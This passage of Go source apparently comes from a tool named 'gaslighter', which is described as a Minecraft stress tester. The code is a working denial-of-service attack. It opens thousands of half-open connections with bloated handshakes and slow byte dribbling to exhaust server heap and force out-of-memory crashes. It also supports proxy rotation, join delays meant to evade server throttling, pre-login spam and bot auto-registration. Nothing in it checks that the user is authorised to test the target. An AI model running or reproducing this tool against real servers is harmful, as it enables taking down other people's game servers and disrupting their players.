			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))
		}
	}
}

func holdConnPlay(conn net.Conn, compressed bool, verbose bool, rng *rand.Rand) {
	defer conn.Close()
	defer activeConns.Add(-1)

	// The cipherConn's CFB8 stream state isn't safe for concurrent writers
	// (encryption depends on strict write ordering), and with --login and
	// --wander both able to fire off goroutines that write independently of
	// the main read loop, all writes need to be serialized through here.
	var connMu sync.Mutex
	writePacket := func(pkt []byte) error {
		connMu.Lock()
		defer connMu.Unlock()
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err := conn.Write(pkt)
		conn.SetWriteDeadline(time.Time{})
		if err == nil {
			bytesSent.Add(int64(len(pkt)))
		}
		return err
	}

	if login {
		go func() {
			time.Sleep(1000 * time.Millisecond)
			pass1 := randString(rng, 10)
			pass2 := randString(rng, 10)

			cmd1 := fmt.Sprintf("register %s", pass1)
			writePacket(buildChatCommand(cmd1, compressed))

			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
			writePacket(buildChatCommand(cmd2, compressed))
		}()
	}

	var (
		posMu            sync.Mutex
		posX, posY, posZ float64
		havePos          bool
	)

	if wander {
		done := make(chan struct{})
		defer close(done)

		go func() {
			// Own RNG source — the caller's rng is also used by the --login
			// goroutine above, and math/rand.Rand isn't safe for concurrent use.
			wRng := rand.New(rand.NewSource(time.Now().UnixNano()))
			moveTicker := time.NewTicker(wanderInterval)
			defer moveTicker.Stop()
			respawnTicker := time.NewTicker(10 * time.Second)
			defer respawnTicker.Stop()

			for {
				select {
				case <-done:
					return

				case <-moveTicker.C:
					posMu.Lock()
					ready := havePos
					x, y, z := posX, posY, posZ
					posMu.Unlock()
					if !ready {
						continue // haven't seen the initial Sync Player Position yet
					}
					if wRng.Intn(2) == 0 {
						x += (wRng.Float64()*2 - 1) * wanderStep
						z += (wRng.Float64()*2 - 1) * wanderStep
					}
					if writePacket(buildPlayerPositionRot(x, y, z, true, compressed)) != nil {
						return
					}
					posMu.Lock()
					posX, posZ = x, z
					posMu.Unlock()

				case <-respawnTicker.C:
					if writePacket(buildClientStatusRespawn(compressed)) != nil {
						return
					}
				}
			}
		}()
	}

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			droppedConns.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "\nplay error: %v\n", err)
			}
			return
		}

		switch id {
		case 0x26: // Keep Alive
			writePacket(buildPacket(0x18, data, compressed))

		case 0x3C: // Synchronize Player Position
			if wander {
				if x, y, z, tid, ok := parseSyncPlayerPosition(data); ok {
					writePacket(buildConfirmTeleport(tid, compressed))
					posMu.Lock()
					posX, posY, posZ = x, y, z
					havePos = true
					posMu.Unlock()
				}
			}
		}
	}
}

func holdConn(conn net.Conn, interval time.Duration, verbose bool) {
	defer conn.Close()
	defer activeConns.Add(-1)

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	headerSent := false
	for range ticker.C {
		var dribble []byte
		if !headerSent {
			dribble = []byte{0xFF, 0xFF, 0x03}
			headerSent = true
		} else {
			dribble = []byte{0x00}
		}
		_, err := conn.Write(dribble)
		if err != nil {
			droppedConns.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "\ndribble error: %v\n", err)
			}
			return
		}
		bytesSent.Add(int64(len(dribble)))
	}
}

// ---------------------------------------------------------------------------
// Worker
// ---------------------------------------------------------------------------

func randString(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func worker(target string, port uint16, bloatSize int, dribbleInterval time.Duration, verbose bool, seed int64, prelogin bool, har bool) {
	rng := rand.New(rand.NewSource(seed))

	for {
		if joinGate != nil {
			<-joinGate
		}

		host := randString(rng, bloatSize)
		handshake := buildHandshake(host, port)

		dialer, err := getDialer()
		if err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "\nproxy dialer: %v\n", err)
			}
			time.Sleep(time.Second)
			continue
		}

		conn, err := dialer.Dial("tcp", target)
		if err != nil {
			droppedConns.Add(1)
			if isConnRefused(err) {
				if offlineDetected.CompareAndSwap(false, true) {
					fmt.Fprintf(os.Stderr, "\n%s[!]%s server went offline (%s) — workers backing off\n", cBoldRed, cReset, target)
				}
				time.Sleep(15 * time.Second)
			} else {
				if verbose {
					fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
				}
				time.Sleep(500 * time.Millisecond)
			}
			continue
		}
		if offlineDetected.CompareAndSwap(true, false) {
			fmt.Fprintf(os.Stderr, "\n%s[✓]%s server back online (%s)\n", cBoldGreen, cReset, target)
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write(handshake)
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			conn.Close()
			if verbose {
				fmt.Fprintf(os.Stderr, "\nhandshake: %v\n", err)
			}
			droppedConns.Add(1)
			continue
		}
		bytesSent.Add(int64(len(handshake)))

		loginPkt := buildLoginStart(randString(rng, 16))
		stallIfEnabled()
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write(loginPkt)
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			conn.Close()
			droppedConns.Add(1)
			continue
		}
		bytesSent.Add(int64(len(loginPkt)))

		if prelogin {
			if !har {
				// Wait for any packet back to ensure the server processed Login Start
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				if _, _, err := readPacket(conn, false); err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "\nprelogin read: %v\n", err)
					}
					droppedConns.Add(1)
				}
			}
			conn.Close()
			activeConns.Add(1) // Briefly count as active for metrics
			activeConns.Add(-1)
			newConns.Add(1)
			continue
		}

		activeConns.Add(1)
		newConns.Add(1)

		activeConn, inPlay, compressed := tryAdvanceToPlay(conn, verbose)
		if inPlay {
			holdConnPlay(activeConn, compressed, verbose, rng)
		} else {
			holdConn(activeConn, dribbleInterval, verbose)
		}
	}
}

// ---------------------------------------------------------------------------
// Reporting / CLI
// ---------------------------------------------------------------------------

func startReporter() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for range ticker.C {
		active := activeConns.Load()
		dropped := droppedConns.Load()
		sent := bytesSent.Load()
		rate := newConns.Swap(0)

		fmt.Printf("\r\033[K[%s] Active: %6d | New/s: %4d | Dropped: %6d | Sent: %s",
			time.Now().Format("15:04:05"),
			active, rate, dropped, fmtBytes(sent),
		)
	}
}

func fmtBytes(n int64) string {
	switch {
	case n >= 1<<30:
		return fmt.Sprintf("%.2fGB", float64(n)/(1<<30))
	case n >= 1<<20:
		return fmt.Sprintf("%.2fMB", float64(n)/(1<<20))
	case n >= 1<<10:
		return fmt.Sprintf("%.2fKB", float64(n)/(1<<10))
	default:
		return fmt.Sprintf("%dB", n)
	}
}

func loadProxies(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			proxyPool = append(proxyPool, line)
		}
	}
	return nil
}

var rootCmd = &cobra.Command{
	Use:     "gaslighter <ip[:port] | hostname>",
	Version: fmt.Sprintf("%s (commit: %s, date: %s)", version, commit, date),
	Short:   "Minecraft G1GC heap-exhaustion stress tester",
	Long: `Holds thousands of half-open Minecraft connections to force G1GC object
promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		inputTarget := args[0]
		var target string
		var port uint16

		_, portStr, err := net.SplitHostPort(inputTarget)
		if err != nil {
			// If SplitHostPort fails, it might be because the port is missing.
			// Handle SRV resolution or default port 25565.
			if net.ParseIP(inputTarget) != nil {
				// It's a raw IP without a port.
				target = net.JoinHostPort(inputTarget, "25565")
				port = 25565
				fmt.Printf("Target is raw IP, defaulting to port 25565: %s\n", target)
			} else {
				// It's a hostname without a port. Try SRV lookup.
				_, addrs, srvErr := net.LookupSRV("minecraft", "tcp", inputTarget)
				if srvErr == nil && len(addrs) > 0 {
					target = net.JoinHostPort(addrs[0].Target, strconv.Itoa(int(addrs[0].Port)))
					port = addrs[0].Port
					fmt.Printf("Resolved SRV record: %s -> %s:%d\n", inputTarget, addrs[0].Target, addrs[0].Port)
				} else {
					// Fallback to default port
					target = net.JoinHostPort(inputTarget, "25565")
					port = 25565
					fmt.Printf("No SRV record found for %s, falling back to port 25565\n", inputTarget)
				}
			}
		} else {
			// Explicit port provided
			target = inputTarget
			portNum, err := strconv.ParseUint(portStr, 10, 16)
			if err != nil {
				return fmt.Errorf("invalid port: %w", err)
			}
			port = uint16(portNum)
		}

		workers, _ := cmd.Flags().GetInt("workers")
		bloatSize, _ := cmd.Flags().GetInt("bloat-size")
		dribble, _ := cmd.Flags().GetDuration("dribble-interval")
		verbose, _ := cmd.Flags().GetBool("verbose")
		debug, _ := cmd.Flags().GetBool("debug")
		joinDelay, _ := cmd.Flags().GetDuration("join-delay")
		accessToken, _ = cmd.Flags().GetString("access-token")
		playerUUID, _ = cmd.Flags().GetString("player-uuid")
		login, _ = cmd.Flags().GetBool("login")
		prelogin, _ = cmd.Flags().GetBool("prelogin")
		har, _ = cmd.Flags().GetBool("har")
		stall, _ = cmd.Flags().GetBool("stall")
		stallDuration, _ = cmd.Flags().GetDuration("stall-duration")
		wander, _ = cmd.Flags().GetBool("wander")
		wanderInterval, _ = cmd.Flags().GetDuration("wander-interval")
		wanderStep, _ = cmd.Flags().GetFloat64("wander-step")

		proxyPath := viper.GetString("proxies")
		if proxyPath != "" {
			if err := loadProxies(proxyPath); err != nil {
				return fmt.Errorf("failed to load proxies: %w", err)
			}
			fmt.Printf("Loaded %d proxies from %s\n", len(proxyPool), proxyPath)
		}

		if bloatSize > 255 {
			return fmt.Errorf("--bloat-size max is 255 (Minecraft protocol limit)")
		}

		// Pre-flight: verify the server is actually listening before we commit.
		{
			d, err := getDialer()
			if err == nil {
				c, err := d.Dial("tcp", target)
				if err != nil {
					if isConnRefused(err) {
						return fmt.Errorf("server is offline — connection refused at %s", target)
					}
					fmt.Fprintf(os.Stderr, "warning: pre-flight check failed (%v) — proceeding anyway\n", err)
				} else {
					c.Close()
				}
			}
		}

		if debug {
			debugRun(target, port, bloatSize, dribble)
			return nil
		}

		if joinDelay > 0 {
			startJoinGate(joinDelay)
		}

		fmt.Printf("mc-stress  target=%s  workers=%d  bloat=%d  dribble=%s  join-delay=%s\n\n",
			target, workers, bloatSize, dribble, joinDelay)

		go startReporter()

		for i := 0; i < workers; i++ {
			go worker(target, port, bloatSize, dribble, verbose, time.Now().UnixNano()+int64(i), prelogin, har)
		}

		select {}
	},
}

func init() {
	initConfig()
	f := rootCmd.Flags()
	f.IntP("workers", "w", 10000, "concurrent connections to maintain")
	f.IntP("bloat-size", "s", 255, "handshake server-address string length (max 255)")
	f.DurationP("dribble-interval", "d", 5*time.Second, "interval between keep-alive bytes")
	f.BoolP("verbose", "v", false, "print per-connection TCP errors")
	f.Bool("debug", false, "single-connection debug mode with colored packet log")
	f.DurationP("join-delay", "j", 0, "minimum gap between new connections (e.g. 4001ms to bypass server throttle)")
	f.StringP("access-token", "a", "", "Mojang access token (online-mode auth)")
	f.StringP("player-uuid", "u", "", "Mojang player UUID matching the access token")
	f.BoolP("login", "l", false, "automatically send /register commands after join")
	f.Bool("prelogin", false, "enable pre-login spam mode (AsyncPlayerPreLoginEvent)")
	f.Bool("har", false, "hit-and-run mode: don't wait for server response in pre-login mode")
	f.Bool("stall", false, "slow down the login sequence to glacial speeds")
	f.Duration("stall-duration", 25*time.Second, "base time to wait between login steps")
	f.Bool("wander", false, "randomly move/hold position once in Play state, forcing unique per-bot chunk loading (no effect on the dribble fallback)")
	f.Duration("wander-interval", 2*time.Second, "how often to roll move-or-hold and send a position update")
	f.Float64("wander-step", 0.5, "max blocks moved per axis when a move is rolled")
	f.StringP("proxies", "p", "", "path to .txt file with SOCKS5 proxies")
	f.String("proxy-strategy", "random", "proxy selection strategy: random or round-robin")
	viper.BindPFlags(f)
}

func initConfig() {
	home, err := os.UserHomeDir()
	if err == nil {
		viper.AddConfigPath(home)
	}
	viper.AddConfigPath(".")
	viper.SetConfigName("gaslighterc")
	viper.SetConfigType("toml")

	viper.AutomaticEnv()

	if err := viper.ReadInConfig(); err == nil {
		// fmt.Println("Using config file:", viper.ConfigFileUsed())
	}
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
